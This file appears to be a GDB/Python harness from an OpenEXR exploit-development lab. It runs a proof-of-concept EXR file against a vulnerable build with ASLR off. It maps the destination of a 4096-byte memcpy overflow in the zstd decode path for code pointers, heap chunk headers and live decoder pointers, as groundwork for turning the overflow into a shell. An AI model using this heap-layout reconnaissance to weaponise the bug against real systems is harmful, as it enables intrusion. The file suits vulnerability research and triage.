# W182: map the 4096-byte sink's destination range on the C++
# DeepScanLineInputFile::readPixels path (W171 mapped only exrcheck's flat path).
# Run from lab/openexr2shell-real:
#   gdb -q -batch -x harness/cpp-heap-victims.cmd bin-vuln-plain/cpp_singlepass
# A source breakpoint at internal_zstd.c:472 resolves past the memcpy; break on
# the 4096-byte memcpy call instead. ASLR off keeps heap bytes byte-stable.
set disable-randomization on
set pagination off
set confirm off
set print pretty off
break memcpy if $rdx == 4096
run cases/poc.exr
python
import gdb, re
inf = gdb.selected_inferior()
d = int(gdb.parse_and_eval("$rdi"))
s = int(gdb.parse_and_eval("$rsi"))
n = int(gdb.parse_and_eval("$rdx"))
def u64(a):
    return int.from_bytes(bytes(inf.read_memory(a, 8)), "little")
print("SINK n=%d src_minus_dst=%d" % (n, s - d))

maps = gdb.execute("info proc mappings", to_string=True)
code = []
rodata = []
exe = gdb.execute("info files", to_string=True)
m = re.search(r"Entry point: 0x([0-9a-f]+)", exe)
entry = int(m.group(1), 16) if m else 0
for line in maps.splitlines():
    parts = line.split()
    if len(parts) < 5 or not parts[0].startswith("0x"):
        continue
    try:
        lo, hi, perm = int(parts[0], 16), int(parts[1], 16), parts[4]
    except ValueError:
        continue
    if "x" in perm:
        code.append((lo, hi))
    elif "r" in perm and lo <= entry < hi:
        rodata.append((lo, hi))

hits = []
for off in range(0, n, 8):
    v = u64(d + off)
    if any(lo <= v < hi for lo, hi in code):
        hits.append(("CODE", off, v))
    elif any(lo <= v < hi for lo, hi in rodata):
        hits.append(("RODATA", off, v))
print(" PTR-HITS total=%d" % len(hits))
for kind, off, v in hits[:40]:
    print(" PTR-HIT %s off=%+d value=0x%x" % (kind, off, v))

base = (d - 16) & ~15
chunks = []
while base < d + n:
    word = u64(base + 8)
    size = word & ~0xf
    if size < 32 or size > (1 << 30):
        print(" BAD-CHUNK off=%+d" % (base - d))
        break
    chunks.append([base, size, word])
    base += size
print(" CHUNK-COUNT total=%d first_off=%d" %
      (len(chunks), chunks[1][0] - d if len(chunks) > 1 else -1))
for (b, sz, old) in chunks[:30]:
    print(" CHUNK off=%+d size=0x%x hdr=0x%x" % (b - d, sz, old))

f = gdb.newest_frame()
locals_to_scan = []
while f is not None:
    for varname in ("decoder", "decode"):
        try:
            locals_to_scan.append((f.name() or "", varname, f.read_var(varname)))
        except Exception:
            pass
    f = f.older()
def scan(val, name, depth):
    if depth > 4: return []
    out = []
    t = val.type.strip_typedefs()
    if t.code == gdb.TYPE_CODE_PTR:
        try: a = int(val)
        except Exception: return out
        if a: out.append((name, a))
    elif t.code == gdb.TYPE_CODE_STRUCT or t.code == gdb.TYPE_CODE_UNION:
        for fld in t.fields():
            if not fld.name: continue
            try: out += scan(val[fld.name], name + "." + fld.name, depth + 1)
            except Exception: pass
    return out
ptrs = []
for (nm, varname, v) in locals_to_scan:
    if v.type.strip_typedefs().code == gdb.TYPE_CODE_PTR:
        try: v = v.dereference()
        except Exception: continue
    ptrs += scan(v, "%s.%s" % (nm, varname), 0)
inside = sorted([(a - d, nm) for (nm, a) in ptrs if d <= a < d + n])
print(" LIVE-PTR-COUNT scanned=%d inside=%d" % (len(ptrs), len(inside)))
for (off, nm) in inside:
    print(" LIVE-PTR-INSIDE %s off=%+d" % (nm, off))
gdb.execute("finish", to_string=True)
bad = sum(1 for (b, sz, old) in chunks if u64(b + 8) != old)
print(" HDR-CORRUPTED %d/%d" % (bad, len(chunks)))
print(" END-PY")
end
continue
quit
